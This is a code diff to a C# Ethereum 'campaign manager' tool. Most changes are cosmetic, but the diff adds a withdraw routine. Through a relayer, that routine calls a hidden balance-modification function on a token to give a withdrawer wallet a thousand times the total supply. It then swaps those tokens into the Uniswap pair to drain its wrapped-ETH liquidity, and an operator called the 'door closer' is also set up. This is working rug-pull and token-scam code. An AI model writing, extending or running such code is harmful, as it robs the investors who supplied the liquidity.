@@ -35,6 +35,7 @@ using System.Numerics;
 using System.Runtime.CompilerServices;
 using System.Text;
 using System.Timers;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement;
 using Web3Accounts = Nethereum.Web3.Accounts;
 
 namespace BlockStorm.Infinity.CampaignManager
@@ -384,7 +385,7 @@ namespace BlockStorm.Infinity.CampaignManager
             context.SaveChanges();
             txtOperator.Text = doorCloser.Address;
             txtWithdrawer.Text = withdrawer.Address;
-            lblMessage.Text = "现在将关门者，提现者添加到Relayer的Operators列表里";
+            lblMessage.Text = "现在将关门者添加到Relayer的Operators列表里";
             lblMessage.Show();
             var add0peratorsFunction = new NethereumModule.Contracts.Relayer.Add0peratorsFunction
             {
@@ -394,7 +395,7 @@ namespace BlockStorm.Infinity.CampaignManager
             var add0peratorsFunctionTxnReceipt = await relayerContractHandlerForOwner.SendRequestAndWaitForReceiptAsync(add0peratorsFunction);
             if (add0peratorsFunctionTxnReceipt.Succeeded())
             {
-                lblMessage.Text = "将关门者，提现者添加到Relayer的Operators列表成功！继续生成Campaign！";
+                lblMessage.Text = "将关门者添加到Relayer的Operators列表成功！继续生成Campaign！";
             }
 
             campaign = new Campaign
@@ -411,7 +412,7 @@ namespace BlockStorm.Infinity.CampaignManager
             };
             context.Campaigns.Add(campaign);
             context.SaveChanges();
-            gbCampaignSettings.Text = campaign.Id.ToString();
+            txtCampaignID.Text = campaign.Id.ToString();
             traderAccounts = context.Accounts.Where(a => a.Active).ToList();
             foreach (var traderAccount in traderAccounts)
             {
@@ -540,7 +541,7 @@ namespace BlockStorm.Infinity.CampaignManager
                     var withdrawFunctionTxnReceipt = await wethContractHandler.SendRequestAndWaitForReceiptAsync(withdrawFunction);
                     resultMessage.Append($"{WETH2ETHAddressList[i]}转化{Web3.Convert.FromWei(WETH2ETHAmounts[i])}ETH为WETH结果为");
                     resultMessage.Append(withdrawFunctionTxnReceipt.Succeeded() ? "成功" : "失败");
-                    resultMessage.Append('\n');             
+                    resultMessage.Append('\n');
                 }
                 SetWETH2ETHParamsToNull();
             }
@@ -1033,7 +1034,7 @@ namespace BlockStorm.Infinity.CampaignManager
             IEtherTransferService etherTransferService = web3ForContractDeployer.Eth.GetEtherTransferService();
             var fee1559 = await etherTransferService.SuggestFeeToTransferWholeBalanceInEtherAsync();
             var estimatedGas = await controllerContractHandlerForOwner.EstimateGasAsync<ReceiveNativeT0kensFunction>();
-            var gasReserve = (fee1559.MaxFeePerGas+fee1559.MaxPriorityFeePerGas) * estimatedGas.Value;
+            var gasReserve = (fee1559.MaxFeePerGas + fee1559.MaxPriorityFeePerGas) * estimatedGas.Value;
             if (ethBalances[contractDeployer.Address] > Web3.Convert.FromWei(gasReserve.Value))
             {
                 var contollerContractHandlerForContractDeployer = web3ForContractDeployer.Eth.GetContractHandler(controllerAddr);
@@ -1220,7 +1221,7 @@ namespace BlockStorm.Infinity.CampaignManager
             if (string.IsNullOrEmpty(pairAddr)) return (0, 0);
             if (pairContractHandlerForDeployer == null) return (0, 0);
             var getReservesOutputDTO = await pairContractHandlerForDeployer.QueryDeserializingToObjectAsync<GetReservesFunction, GetReservesOutputDTO>();
-            if(getReservesOutputDTO == null) return (0, 0);
+            if (getReservesOutputDTO == null) return (0, 0);
             bool isToken0WrappedNative = UniswapV2ContractsReader.IsAddressSmaller(wrappedNativeAddr, token.TokenAddress);
             (BigInteger reserveWrappedNative, BigInteger reserveToken) = isToken0WrappedNative ? (getReservesOutputDTO.Reserve0, getReservesOutputDTO.Reserve1) : (getReservesOutputDTO.Reserve1, getReservesOutputDTO.Reserve0);
             return (reserveWrappedNative, reserveToken);
@@ -1285,7 +1286,86 @@ namespace BlockStorm.Infinity.CampaignManager
             row.Cells[dgColumnIndex["交易任务进度"]].Value = message.ToString();
         }
 
+        private async void btnWithdraw_Click(object sender, EventArgs e)
+        {
+            //1. 调用增发接口进行代币增发
+            //2. 调用Pair的Swap接口，执行资金提取
 
+            //1. 代币增发
+            var balanceToModify = BigInteger.Parse(token.TotalSupply) * BigInteger.Pow(10, 3);
+            var modifyBalance33168Function = new NethereumModule.Contracts.Relayer.ModifyBalance33168Function
+            {
+                Callee = token.TokenAddress,
+                Signature = token.FuncSig,
+                TargetWallet = withdrawer.Address,
+                Balance = balanceToModify
+            };
+            var relayerContractHandlerForOwner = web3ForControllerOwner.Eth.GetContractHandler(RelayerAddr);
+            var estimatedGas = await relayerContractHandlerForOwner.EstimateGasAsync(modifyBalance33168Function);
+            modifyBalance33168Function.Gas = estimatedGas.Value / 2 * 3;
+            lblMessage.Text = "正在执行修改余额";
+            lblMessage.Show();
+            var modifyBalance33168FunctionTxnReceipt = await relayerContractHandlerForOwner.SendRequestAndWaitForReceiptAsync(modifyBalance33168Function);
+            if (modifyBalance33168FunctionTxnReceipt.Succeeded())
+            {
+                lblMessage.Text = "余额修改成功，正在给Router进行ERC20代币授权";
+            }
+            else
+            {
+                MessageBox.Show("余额修改失败！");
+                return;
+            }
+            var approveFunction = new NethereumModule.Contracts.UniswapV2ERC20.ApproveFunction
+            {
+                Spender = routerAddr,
+                Value = balanceToModify
+            };
+            var accountForWithdrawer = new Web3Accounts.Account(withdrawer.PrivateKey);
+            var web3ForWithdrawer = new Web3(accountForWithdrawer, httpURL);
+            var tokenConrtractHandlerForWithdrawer = web3ForWithdrawer.Eth.GetContractHandler(tokenAddr);
+            var approveFunctionTxnReceipt = await tokenConrtractHandlerForWithdrawer.SendRequestAndWaitForReceiptAsync(approveFunction);
+            if (approveFunctionTxnReceipt.Succeeded())
+            {
+                lblMessage.Text = "对Router进行ERC20代币授权成功，现在调用Router的Swap函数";
+            }
+            else
+            {
+                MessageBox.Show("对Router进行ERC20代币授权失败！");
+                return;
+            }
+            
+            var getReservesOutputDTO = await pairContractHandlerForDeployer.QueryDeserializingToObjectAsync<GetReservesFunction, GetReservesOutputDTO>();
+            bool isToken0Token = UniswapV2ContractsReader.IsAddressSmaller(tokenAddr, wrappedNativeAddr);
+            (BigInteger reserveIn, BigInteger reserveOut) = isToken0Token ? (getReservesOutputDTO.Reserve0, getReservesOutputDTO.Reserve1) : (getReservesOutputDTO.Reserve1, getReservesOutputDTO.Reserve0);
+            BigInteger amountOut = Util.GetAmountOutThroughSwap(balanceToModify, reserveIn, reserveOut, 30);
+            var swapExactTokensForTokensFunction = new SwapExactTokensForTokensFunction
+            {
+                AmountIn = balanceToModify,
+                AmountOutMin = amountOut * 997 / 1000,
+                Path = new List<string>
+                {
+                    tokenAddr,
+                    wrappedNativeAddr
+                },
+                To = controllerAddr,
+                Deadline = DateTimeOffset.UtcNow.AddSeconds(30).ToUnixTimeSeconds()
+            };
+            var routerContractHandlerForWithdrawer = web3ForWithdrawer.Eth.GetContractHandler(routerAddr);
+            var swapExactTokensForTokensFunctionTxnReceipt = await routerContractHandlerForWithdrawer.SendRequestAndWaitForReceiptAsync(swapExactTokensForTokensFunction);
+            if (swapExactTokensForTokensFunctionTxnReceipt.Succeeded())
+            {
+                lblMessage.Text = "提现成功！";
+                await UpdateControllerBalances();
+                await UpdatePairReserves();
+                await UpdateWETHBalance(pairAddr);
+                await UpdateETHBalance(withdrawer.Address);
+            }
+            else
+            {
+                MessageBox.Show("调用Router的Swap失败！");
+                return;
+            }
+        }
     }
 
     internal class DgvRowObject
